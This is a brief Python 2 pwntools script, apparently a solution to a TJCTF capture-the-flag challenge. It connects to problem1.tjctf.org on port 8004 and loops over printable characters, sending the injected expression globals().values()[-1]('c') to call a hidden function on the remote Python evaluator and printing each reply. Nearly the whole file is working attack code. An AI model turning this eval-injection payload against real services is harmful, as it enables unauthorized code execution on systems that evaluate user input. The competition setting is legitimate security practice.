#!/usr/bin/env python

# nc problem1.tjctf.org 8004

from pwn import *
import string
context.log_level = 'critical'

s = remote('problem1.tjctf.org', 8004)

s.recv()

for c in string.printable:
    s.recv()
    send = "globals().values()[-1]('" + c + "')"
    s.sendline(send)
    print s.recv()

s.close()
